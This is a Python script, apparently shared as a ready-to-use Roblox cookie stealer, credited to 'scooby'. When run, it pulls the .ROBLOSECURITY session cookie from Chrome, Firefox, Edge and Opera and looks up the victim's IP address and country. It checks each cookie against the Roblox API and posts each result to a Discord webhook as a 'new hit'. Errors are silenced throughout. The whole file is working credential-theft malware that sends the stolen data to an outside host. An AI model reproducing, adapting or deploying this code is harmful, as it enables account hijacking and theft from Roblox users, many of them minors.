import os 
import requests
import json
import browser_cookie3

webhook = 'discord.api/webhook_here'


__credits__ = 'scooby'

class main():
   def cookies(self,webhook):
      listofcookies = []
      info = requests.get("http://ipinfo.io/json").json()
      c = info['country']
      ip = info['ip']
      try:
         cookies = browser_cookie3.chrome(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass
      try:
         cookies = browser_cookie3.firefox(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass
      try:
         cookies = browser_cookie3.edge(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass
      try:
         cookies = browser_cookie3.opera(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         listofcookies.append(cookie)
      except:pass 
      for i in listofcookies:
         try:
            r = requests.get("https://www.roblox.com/mobileapi/userinfo", cookies={".ROBLOSECURITY": i}).json()
            info = {"content": '',"embeds": [{"color": 11014160,"footer": {"text": "scooby ; .gg/comped"},"image": {"url": "https://media.discordapp.net/attachments/972490150418456616/1010172706903293952/ddf19ded4728f2695331f525d0400147.jpg"}},{"description": f"**new hit ; **\n\nip ; ``{ip}``\ncountry ; ``{c}``\n\ncookie ; \n```fix\n{i}\n```","color": 11014160}],"username": ".gg/comped","avatar_url": "https://cdn.discordapp.com/attachments/972533865354772561/1039775714469224509/IMG_7011.jpg","attachments": []}
            requests.post(webhook,json=info)
         except:pass
if __credits__ == "scooby":
   main = main()
   main.cookies(webhook)
